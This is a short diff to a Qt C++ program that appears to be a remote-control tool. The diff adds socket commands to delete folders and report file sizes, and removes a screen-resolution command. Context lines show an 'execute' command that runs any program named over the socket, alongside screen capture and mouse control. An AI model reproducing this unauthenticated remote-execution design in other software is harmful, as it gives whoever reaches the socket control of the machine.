@@ -247,6 +247,16 @@ void MainWindow::llegadaDatos() {
     if (parametros[0] == "createfolder"){
         directorio.mkdir(parametros[1]);
     }
+    if (parametros[0] == "borrarcarpeta")
+    {
+        directorio.rmdir(parametros[1]);
+    }
+    if (parametros[0] == "tamano")
+    {
+        QString tamano;
+        tamano.setNum(QFileInfo(parametros[1]).size());
+        util.escribirSocket("tamano|@|" + tamano,&socket);
+    }
     if (parametros[0] == "execute")
     {
         QProcess::startDetached(parametros[1]);
@@ -424,14 +434,7 @@ void MainWindow::llegadaDatosEscritorio(){
         hacerClickIzquierdo();
         #endif
     }
-    if (parametros[0] == "resolucion")
-    {
-        QString ancho;
-        ancho.setNum(QApplication::desktop()->height());
-        QString alto;
-        alto.setNum(QApplication::desktop()->width());
-        util.escribirSocket("resolucion|@|" + ancho + "|@|" + alto,&socket);
-    }
+
     if (parametros[0] == "capturar")
     {
         QPixmap captura;
